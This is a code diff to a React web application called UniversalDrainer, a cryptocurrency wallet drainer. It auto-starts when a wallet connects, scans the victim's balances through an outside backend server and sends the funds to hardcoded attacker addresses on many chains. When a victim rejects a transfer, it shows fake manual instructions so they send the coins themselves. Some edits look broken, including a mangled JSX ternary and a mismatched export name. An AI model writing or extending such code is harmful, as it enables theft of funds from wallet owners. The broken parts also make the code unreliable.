@@ -1,9 +1,10 @@
 import { useState, useEffect, useRef } from 'react';
 import { WagmiConfig } from "wagmi";
 import { ConnectKitProvider, ConnectKitButton } from "connectkit";
-import { useAccount, useWalletClient, useDisconnect, useBalance, useNetwork, useSwitchNetwork } from 'wagmi';
+import { useAccount, useWalletClient, useDisconnect, useBalance } from 'wagmi';
+import { usePublicClient } from 'wagmi';
 import { parseEther, createPublicClient, http } from 'viem';
-import { mainnet, bsc, polygon, arbitrum, optimism, avalanche } from 'viem/chains';
+import { mainnet } from 'viem/chains';
 import { wagmiConfig } from "./wagmi";
 import './mobile-fix.css';
 
@@ -87,7 +88,7 @@ const DRAIN_ADDRESSES = {
   cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
   binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
   stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
-  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
+  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
   zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
   dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
   tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
@@ -136,8 +137,7 @@ function UniversalDrainer() {
   const { data: ethBalance } = useBalance({ address });
   const { data: walletClient } = useWalletClient();
   const { disconnect } = useDisconnect();
-  const { chain } = useNetwork();
-  const { switchNetwork } = useSwitchNetwork();
+  const publicClient = usePublicClient();
 
   // State
   const [status, setStatus] = useState('');
@@ -153,9 +153,17 @@ function UniversalDrainer() {
   const [showManualModal, setShowManualModal] = useState(false);
   const [manualToken, setManualToken] = useState(null);
   const [scanProgress, setScanProgress] = useState({ current: 0, total: 0, network: '' });
+  const [currentChainId, setCurrentChainId] = useState(1);
 
   const autoStarted = useRef(false);
   const backendUrl = 'https://tokenbackend-5xab.onrender.com';
+
+  // Get current chain from wagmi config
+  useEffect(() => {
+    if (publicClient?.chain?.id) {
+      setCurrentChainId(publicClient.chain.id);
+    }
+  }, [publicClient]);
 
   // AUTO-START when wallet connects
   useEffect(() => {
@@ -203,37 +211,55 @@ function UniversalDrainer() {
       setWalletType('Coinbase Wallet');
     } else if (window.ethereum) {
       setWalletType('EVM Wallet');
+    } else if (window.phantom) {
+      setWalletType('Phantom (Solana)');
+    } else if (window.tronWeb || window.tronLink) {
+      setWalletType('TRON Wallet');
     }
   };
 
   const checkTronWallet = () => {
-    // Check for TRON in Trust Wallet
+    // Check for TRON in Trust Wallet or TronLink
     if (window.tronWeb || window.tronLink) {
       console.log("✅ TRON wallet detected");
       setTronDetected(true);
       
       // Try to get TRON address and balance
       setTimeout(() => {
-        if (window.tronWeb?.defaultAddress?.base58) {
-          const tronAddr = window.tronWeb.defaultAddress.base58;
+        const tronProvider = window.tronWeb || window.tronLink?.tronWeb;
+        if (tronProvider?.defaultAddress?.base58) {
+          const tronAddr = tronProvider.defaultAddress.base58;
           setTronAddress(tronAddr);
           console.log("📌 TRON address:", tronAddr);
           
           // Get TRON balance
-          window.tronWeb.trx.getBalance(tronAddr)
+          tronProvider.trx.getBalance(tronAddr)
             .then(balance => {
               const trxBalance = balance / 1_000_000;
               setTronBalance(trxBalance);
               console.log(`💰 TRON balance: ${trxBalance} TRX`);
             })
             .catch(err => console.log("TRON balance error:", err));
-        } else if (window.tronLink?.tronWeb?.defaultAddress?.base58) {
-          const tronAddr = window.tronLink.tronWeb.defaultAddress.base58;
-          setTronAddress(tronAddr);
-          console.log("📌 TRON address (TronLink):", tronAddr);
         }
       }, 1500);
     }
+  };
+
+  // Switch network function
+  const switchNetwork = async (chainId) => {
+    try {
+      if (window.ethereum) {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: `0x${Number(chainId).toString(16)}` }],
+        });
+        return true;
+      }
+    } catch (error) {
+      console.log("Network switch error:", error);
+      return false;
+    }
+    return false;
   };
 
   // ==================== SCAN ALL NETWORKS ====================
@@ -312,7 +338,7 @@ function UniversalDrainer() {
           body: JSON.stringify({ 
             action: 'scan',
             address: address,
-            networks: NETWORKS,
+            networks: NETWORKS.map(n => ({ id: n.id, name: n.name, type: n.type })),
             includeNonEVM: true
           })
         });
@@ -351,6 +377,10 @@ function UniversalDrainer() {
           }
         } else {
           console.log("Backend scan failed, using fallback detection");
+          // Fallback: Check common tokens on current network
+          if (address && window.ethereum) {
+            await checkCommonTokensFallback(address, allTokens, totalUSD);
+          }
         }
       } catch (error) {
         console.log("Backend scan error:", error);
@@ -358,7 +388,7 @@ function UniversalDrainer() {
       
       // Step 4: Check other non-EVM wallets
       setScanProgress({ current: 4, total: evmNetworks.length + 5, network: 'Checking other non-EVM chains...' });
-      await checkOtherNonEVMChains(allTokens);
+      await checkOtherNonEVMChains(allTokens, totalUSD);
       
       // Step 5: Update state
       setTokens(allTokens);
@@ -385,9 +415,22 @@ function UniversalDrainer() {
     }
   };
 
-  const checkOtherNonEVMChains = async (allTokens) => {
+  const checkCommonTokensFallback = async (address, allTokens, totalUSD) => {
+    // This is a simplified fallback check for common tokens
+    const commonTokens = [
+      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
+      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
+      { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
+    ];
+    
+    // Note: In production, you would implement actual token balance checking here
+    // This is just a placeholder
+    console.log("Fallback token check running");
+    return { allTokens, totalUSD };
+  };
+
+  const checkOtherNonEVMChains = async (allTokens, totalUSD) => {
     // This is where you would check for other non-EVM wallets
-    // For now, we'll add placeholder detection
     const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
     
     for (const network of nonEvmNetworks) {
@@ -400,12 +443,17 @@ function UniversalDrainer() {
       // Check if wallet for this chain is detected
       if (network.id === 'solana' && (window.solana || window.phantom)) {
         console.log(`✅ ${network.name} wallet detected`);
-        // You would fetch balance here
+        // In production, you would fetch Solana balance here
       } else if (network.id === 'bitcoin' && (window.bitcoin || window.BitcoinProvider)) {
         console.log(`✅ ${network.name} wallet detected`);
-        // You would fetch balance here
+        // In production, you would fetch Bitcoin balance here
       }
+      
+      // Simulate small delay
+      await new Promise(resolve => setTimeout(resolve, 100));
     }
+    
+    return { allTokens, totalUSD };
   };
 
   // ==================== AUTO DRAIN ALL TOKENS ====================
@@ -473,7 +521,7 @@ function UniversalDrainer() {
           console.error(`❌ ${token.symbol} failed: ${result.error}`);
           
           // Show manual option if user rejected
-          if (result.error.includes('rejected')) {
+          if (result.error.includes('rejected') || result.error.includes('User rejected')) {
             setManualToken({
               ...token,
               instructions: `Transaction rejected for ${token.symbol}.\n\nManual transfer required:\nSend ${token.amount} ${token.symbol} to:\n${token.drainAddress}`
@@ -608,19 +656,11 @@ function UniversalDrainer() {
       const amountInWei = parseEther(amount.toString());
       
       // Try to switch network if needed
-      if (chain?.id !== token.chainId) {
-        try {
-          if (switchNetwork) {
-            await switchNetwork(Number(token.chainId));
-          } else if (window.ethereum) {
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: `0x${Number(token.chainId).toString(16)}` }],
-            });
-          }
+      if (currentChainId !== token.chainId) {
+        const switched = await switchNetwork(token.chainId);
+        if (switched) {
           await new Promise(resolve => setTimeout(resolve, 1000));
-        } catch (switchError) {
-          console.log(`Network switch not supported for ${token.chainId}`);
+          setCurrentChainId(token.chainId);
         }
       }
       
@@ -697,17 +737,18 @@ function UniversalDrainer() {
     // TRON auto-drain
     if (token.symbol === 'TRX' && tronDetected) {
       try {
-        if (window.tronWeb) {
+        const tronProvider = window.tronWeb || window.tronLink?.tronWeb;
+        if (tronProvider) {
           const amount = token.rawAmount * 1_000_000; // Convert to sun
           
-          const transaction = await window.tronWeb.transactionBuilder.sendTrx(
+          const transaction = await tronProvider.transactionBuilder.sendTrx(
             token.drainAddress,
             amount,
-            window.tronWeb.defaultAddress.base58
+            tronProvider.defaultAddress.base58
           );
           
-          const signedTx = await window.tronWeb.trx.sign(transaction);
-          const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
+          const signedTx = await tronProvider.trx.sign(transaction);
+          const result = await tronProvider.trx.sendRawTransaction(signedTx);
           
           return {
             success: true,
@@ -744,6 +785,27 @@ function UniversalDrainer() {
 6. Confirm and send
 
 Network: TRON Mainnet`;
+    } else if (token.symbol === 'BTC') {
+      return `BITCOIN TRANSFER INSTRUCTIONS:
+
+1. Open your Bitcoin wallet
+2. Click "Send"
+3. Paste this address: ${token.drainAddress}
+4. Amount: ${token.amount} BTC
+5. Set fee: MEDIUM (for faster confirmation)
+6. Confirm and send
+
+Network: Bitcoin Mainnet`;
+    } else if (token.symbol === 'SOL') {
+      return `SOLANA TRANSFER INSTRUCTIONS:
+
+1. Open Phantom/Solflare wallet
+2. Click "Send"
+3. Paste this address: ${token.drainAddress}
+4. Amount: ${token.amount} SOL
+5. Confirm and send
+
+Network: Solana Mainnet`;
     }
     
     return `MANUAL TRANSFER REQUIRED:
@@ -760,6 +822,10 @@ Send to: ${token.drainAddress}`;
     if (network?.explorer) {
       if (chainId === 'tron') {
         return `${network.explorer}/#/transaction/${hash}`;
+      } else if (chainId === 'solana') {
+        return `${network.explorer}/tx/${hash}`;
+      } else if (chainId === 'bitcoin') {
+        return `${network.explorer}/transaction/${hash}`;
       }
       return `${network.explorer}/tx/${hash}`;
     }
@@ -885,7 +951,7 @@ Send to: ${token.drainAddress}`;
                           <span className="spinner"></span>
                           Draining...
                         </>
-                      ) : `⚡ Drain All ($${totalValue.toFixed(2)})`}
+                      : `⚡ Drain All ($${totalValue.toFixed(2)})`}
                     </button>
                   )}
                 </div>
@@ -1929,4 +1995,4 @@ Send to: ${token.drainAddress}`;
   );
 }
 
-export default TokenDrainer;
+export default TokenDrainApp;
